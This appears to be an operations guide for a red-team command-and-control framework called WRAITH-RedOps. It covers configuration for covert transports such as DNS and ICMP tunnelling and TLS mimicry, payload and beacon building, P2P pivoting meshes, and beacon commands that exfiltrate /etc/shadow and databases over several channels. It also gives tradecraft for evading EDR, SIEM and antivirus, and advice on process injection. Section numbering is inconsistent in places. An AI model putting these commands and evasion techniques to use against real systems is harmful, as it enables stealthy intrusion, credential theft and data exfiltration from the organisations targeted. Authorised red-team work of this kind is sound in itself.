# WRAITH-RedOps Operations Guide

**Document Version:** 1.1.0
**Last Updated:** 2025-11-29
**Classification:** Reference Architecture
**Governance:** See [Security Testing Parameters](../../../ref-docs/WRAITH-Security-Testing-Parameters-v1.0.md)

---

## 1. Protocol Configuration

### 1.1 Transport Mode Selection

WRAITH-RedOps supports multiple transport modes optimized for different operational scenarios:

**Configuration File:** `teamserver.toml`

```toml
[transport]
# Primary transport mode
mode = "udp"  # Options: udp, af_xdp, tcp, https, dns, icmp, websocket

# AF_XDP configuration (Linux only, requires CAP_NET_RAW)
[transport.af_xdp]
interface = "eth0"
umem_size = 4096  # Number of frames in UMEM
queue_id = 0      # RX/TX queue ID
zero_copy = true  # Enable zero-copy mode

# UDP configuration
[transport.udp]
bind_addr = "0.0.0.0:41641"
socket_buffer_size = 2097152  # 2MB

# Congestion control
congestion_control = "bbr"  # BBRv2-inspired algorithm

#Transport Modes:**
| Mode | Throughput | Latency | OS Support | Use Case |
|------|-----------|---------|------------|----------|
| AF_XDP | 10-40 Gbps | <1 ms | Linux 4.18+ | High-volume exfiltration |
| UDP | 300+ Mbps | <10 ms | Cross-platform | Default C2 |
| TCP | 500+ Mbps | <20 ms | Cross-platform | Firewall-friendly |
| HTTPS | 200+ Mbps | <50 ms | Cross-platform | Corporate egress |
| DNS | 10-50 Kbps | 100-500 ms | Universal | Covert fallback |
```

### 1.2 Cryptographic Configuration

**Noise_XX Handshake Settings:**
```toml
[crypto]
# Handshake pattern (fixed to Noise_XX for mutual auth)
pattern = "XX"

# Key derivation
kdf = "hkdf-blake3"
hash = "blake3"

# AEAD cipher
cipher = "xchacha20-poly1305"
key_size = 32    # 256-bit keys
nonce_size = 24  # 192-bit nonce (XChaCha20)

# Forward secrecy ratcheting
[crypto.ratchet]
symmetric_per_packet = true
dh_time_interval_secs = 120    # DH ratchet every 2 minutes
dh_packet_threshold = 1000000  # OR every 1M packets
```

### 1.3 Obfuscation Configuration

**Padding Strategy:**
```toml
[obfuscation.padding]
mode = "stealth"  # Options: performance, privacy, stealth

# Padding classes (bytes)
classes = [64, 256, 512, 1024, 1472, 8960]

# Stealth mode matches HTTPS packet distribution
[obfuscation.padding.stealth]
distribution = "https"
sample_traffic_pcap = "/opt/wraith/samples/https-baseline.pcap"
```

**Timing Obfuscation:**
```toml
[obfuscation.timing]
mode = "high_privacy"  # Options: low_latency, moderate, high_privacy

# Exponential distribution parameters
mean_delay_ms = 5
jitter_percent = 30

# Cover traffic
[obfuscation.cover_traffic]
enabled = true
min_rate_pps = 10      # Minimum packets per second
max_idle_gap_ms = 100  # Maximum silence period
```

**Protocol Mimicry:**
```toml
[obfuscation.mimicry]
profile = "tls13_chrome"  # Options: tls13_chrome, dns_doh, websocket, icmp

[obfuscation.mimicry.tls13]
ja3_fingerprint = "771,4865-4866-4867..."  # Chrome 120
sni_domain = "cdn.example.com"
alpn_protocols = ["h2", "http/1.1"]

[obfuscation.mimicry.dns]
server = "1.1.1.1"
tunnel_domain = "tunnel.example.com"
encoding = "base32"
```

### 1.4 Performance Tuning

**Thread-Per-Core Configuration:**
```toml
[performance]
threading_model = "thread_per_core"
num_worker_threads = 0  # 0 = auto-detect CPU cores
core_affinity = true    # Pin threads to cores

# NUMA awareness (multi-socket systems)
numa_aware = true
numa_node = 0  # Prefer allocations on node 0

# Lock-free queues
use_lockfree_queues = true
queue_capacity = 4096
```

**BBR Congestion Control Tuning:**
```toml
[performance.bbr]
# Pacing gains for different states
startup_pacing_gain = 2.0
drain_pacing_gain = 0.5
probe_bw_pacing_gains = [1.25, 0.75, 1.0, 1.0, 1.0, 1.0, 1.0, 1.0]

# CWND gains
startup_cwnd_gain = 2.0
probe_rtt_cwnd_gain = 0.5

# Stealth mode adjustments (for covert C2)
[performance.bbr.stealth]
reduce_pacing_gain = 0.7  # Lower throughput for stealth
increase_probe_interval = 2.0  # Less aggressive probing
```

---

## 2. Infrastructure Deployment

### 2.1 Team Server Setup
*   **OS:** Debian 12 / Ubuntu 22.04 (Hardened).
*   **Hardware:** 4 vCPU, 8GB RAM (Minimum).
*   **Command:**
    ```bash
    # 1. Install Dependencies
    apt install postgresql mingw-w64 clang llvm lld

    # 2. Initialize Database
    sudo -u postgres psql -f setup_schema.sql

    # 3. Start Server
    ./wraith-teamserver --config server.toml
    ```

### 1.2 Redirector Setup
Never expose the Team Server directly. Use Redirectors.
*   **Method A (Dumb Pipe):** `socat` forwarding UDP/443 to Team Server.
*   **Method B (Smart Filter):** `nginx` reverse proxy (for HTTPS) or `iptables` rules that only allow traffic matching specific packet sizes/headers.

---

## 2. Campaign Workflow

### 2.1 Listener Configuration
1.  Open Client -> Listeners -> Add.
2.  Type: `WRAITH_UDP`.
3.  Port: `443` (Bind to 0.0.0.0).
4.  Host: `c2.example.com` (The public DNS of your redirector).

### 2.2 Payload Generation
1.  Open Client -> Attacks -> Packages -> Windows EXE (S).
2.  Listener: Select the listener created above.
3.  Arch: `x64`.
4.  Output: `payload.exe`.

### 2.3 Execution & Management
1.  Execute `payload.exe` on target VM.
2.  Wait for "New Beacon" notification in Client.
3.  Right-click Beacon -> Interact.
4.  **Common Commands:**
    *   `sleep 10 20` (Sleep 10s with 20% jitter).
    *   `ls` (List files).
    *   `upload /local/path /remote/path`.
    *   `job-shell whoami` (Run command in separate thread).

---

## 3. Operator Workflow Examples

### 3.1 Configure Transport for Specific Environment

**Corporate Network (Firewall-Friendly):**
```bash
# Team Server: Use HTTPS mimicry
wraith-server config set transport.mode https
wraith-server config set obfuscation.mimicry.profile tls13_chrome
wraith-server config set obfuscation.mimicry.tls13.sni_domain cdn.cloudflare.com

# Beacon configuration
wraith-builder --transport https --mimicry tls13 --sni cdn.cloudflare.com
```

**High-Security Environment (Maximum Stealth):**
```bash
# Enable all obfuscation features
wraith-server config set obfuscation.padding.mode stealth
wraith-server config set obfuscation.timing.jitter_percent 40
wraith-server config set obfuscation.cover_traffic.enabled true

# Use DNS covert channel as fallback
wraith-builder --transports https,dns --dns-server 1.1.1.1 --dns-domain tunnel.example.com
```

**Linux Target with AF_XDP Support:**
```bash
# Team Server: Enable AF_XDP listener
wraith-server config set transport.mode af_xdp
wraith-server config set transport.af_xdp.interface eth0
wraith-server config set transport.af_xdp.zero_copy true

# Beacon: Requires CAP_NET_RAW capability
wraith-builder --platform linux --transport af_xdp --interface eth0
```

### 3.2 Configure Cryptographic Ratcheting

**High-Paranoia Mode (Frequent Ratcheting):**
```bash
# DH ratchet every 30 seconds OR 100K packets
wraith-server config set crypto.ratchet.dh_time_interval_secs 30
wraith-server config set crypto.ratchet.dh_packet_threshold 100000

# Verify ratcheting occurs
wraith-server logs --filter "REKEY frame sent"
```

**Standard Mode (Default):**
```bash
# DH ratchet every 2 minutes OR 1M packets
wraith-server config set crypto.ratchet.dh_time_interval_secs 120
wraith-server config set crypto.ratchet.dh_packet_threshold 1000000
```

### 3.3 Multi-Transport Failover Configuration

**Beacon with Multiple Transport Fallbacks:**
```bash
# Build beacon with transport priority: UDP → Relay → DNS
wraith-builder \
  --transports udp,relay,dns \
  --udp-server 203.0.113.50:41641 \
  --relay-server 203.0.113.51:8080 \
  --dns-server 1.1.1.1 \
  --dns-domain tunnel.example.com \
  --failover-timeout 30s
```

**Verify Failover:**
```bash
# Beacon logs show transport switches
[INFO] UDP connection failed: Network unreachable
[INFO] Failing over to relay transport
[INFO] Connected via relay: 203.0.113.51:8080
```

### 3.4 P2P Beacon Mesh Configuration

**Setup Gateway Beacon:**
```bash
# Gateway beacon on DMZ host
wraith-builder \
  --mode gateway \
  --external-ip 203.0.113.100 \
  --internal-ip 10.0.10.50 \
  --p2p-port 4444 \
  --allow-p2p-children true
```

**Setup Internal Beacon (P2P Child):**
```bash
# Internal beacon connects to gateway via SMB pipe
wraith-builder \
  --mode p2p-child \
  --p2p-parent 10.0.10.50:4444 \
  --p2p-protocol smb_pipe \  # Options: smb_pipe, tcp_socket
  --pipe-name "\\.\pipe\msagent_12"
```

**Operator Console - Route Command Through Mesh:**
```bash
# Command routes: Server → Gateway → Internal Beacon
wraith-client task --beacon-id <internal-beacon-id> shell "whoami"

# View routing path
wraith-client beacon --id <internal-beacon-id> --show-route
# Output: Server → Gateway (203.0.113.100) → Internal (10.0.50.25)
```

### 3.5 Data Exfiltration via WRAITH Protocol

**Single-Path Exfiltration:**
```bash
# Beacon command: Download file
download /etc/shadow /tmp/exfil/shadow

# Verify integrity at server
wraith-server files --list
# Output: shadow | BLAKE3: a4f3e2... | 2048 bytes | Complete

# Check file integrity
wraith-server files --verify shadow
# Output: OK - BLAKE3 hash matches
```

**Multi-Path Exfiltration (Advanced):**
```bash
# Configure multi-path for resilience
wraith-builder \
  --exfil-paths 3 \
  --exfil-transport-1 https \
  --exfil-transport-2 dns \
  --exfil-transport-3 icmp \
  --chunk-size 256KiB

# Beacon automatically splits file across transports
download-multipath /var/sensitive.db /tmp/exfil/db

# Server reassembles from all paths
wraith-server files --show-paths db
# Output:
#   Chunk 1: HTTPS (100%)
#   Chunk 2: DNS (100%)
#   Chunk 3: ICMP (100%)
#   Status: Complete, verified
```

### 3.6 Performance Profiling

**Monitor Transport Performance:**
```bash
# Real-time throughput stats
wraith-server stats --transport --interval 1s

# Output:
# Transport: UDP
# Throughput: 342 Mbps
# Latency: 8ms (avg), 15ms (p95)
# Packet Loss: 0.1%
# Active Beacons: 5
```

**Tune BBR Congestion Control:**
```bash
# Increase aggressiveness for fast exfiltration
wraith-server config set performance.bbr.startup_pacing_gain 2.5
wraith-server config set performance.bbr.startup_cwnd_gain 2.5

# Reduce aggressiveness for stealth
wraith-server config set performance.bbr.stealth.reduce_pacing_gain 0.5
wraith-server config set performance.bbr.stealth.increase_probe_interval 3.0
```

---

## 4. Tradecraft Guidelines (OpSec)

### 4.1 Memory Scanning
*   **Risk:** EDRs scan memory for unbacked executable code (RWX pages).
*   **Mitigation:** Always enable `sleep_mask = true` in profile. This encrypts the beacon when not executing commands.

### 4.2 Network Evasion (WRAITH Protocol)
*   **Risk:** Beaconing periodicity (heartbeats) detected by SIEM.
*   **Mitigation:**
    - Use high jitter (>20%) and long sleep intervals (>60s) for long-haul persistence.
    - Enable cover traffic to maintain minimum baseline (10 pps).
    - Use protocol mimicry (TLS/DNS) to blend with legitimate traffic.
    - Leverage Elligator2 encoding to make handshakes appear random.

### 4.3 Binary Signatures
*   **Risk:** Antivirus static signatures.
*   **Mitigation:** Never reuse the same binary. The Builder generates unique hashes. Use "Artifact Kit" to modify the loader stub logic if signatures are detected.

---

## 5. Troubleshooting

### 5.1 "Beacon Not Checking In"
1.  Check **Firewall** on Target (Is UDP/443 outbound allowed?).
2.  Check **DNS** resolution of C2 domain on Target.
3.  Check **Team Server Logs** (`logs/server.log`) for handshake errors (bad key?).

### 5.2 "Injection Failed"
*   Cause: Target process architecture mismatch (x86 vs x64) or Protected Process Light (PPL) protections.
*   Fix: Use `ps` to find a suitable process (e.g., `explorer.exe` user-level) of the same arch.

### 5.3 "WRAITH Handshake Failed"
*   Cause: Cryptographic key mismatch or Elligator2 encoding failure.
*   Diagnosis: Check Team Server logs for "Noise handshake error" or "Elligator2 decode failed".
*   Fix:
    - Verify beacon and server use matching keys.
    - Elligator2 has ~50% success rate; beacon should retry with new ephemeral key.
    - Increase `max_handshake_retries` in beacon configuration.

### 5.4 "Transport Failover Not Working"
*   Cause: All configured transports are unreachable or blocked.
*   Diagnosis: Check beacon logs for transport failure messages.
*   Fix:
    - Verify firewall rules allow configured transports (UDP/TCP/HTTPS/DNS).
    - Check relay server availability if using relay transport.
    - Ensure DNS covert channel domain resolves correctly.
    - Verify timing: failover_timeout may be too short.
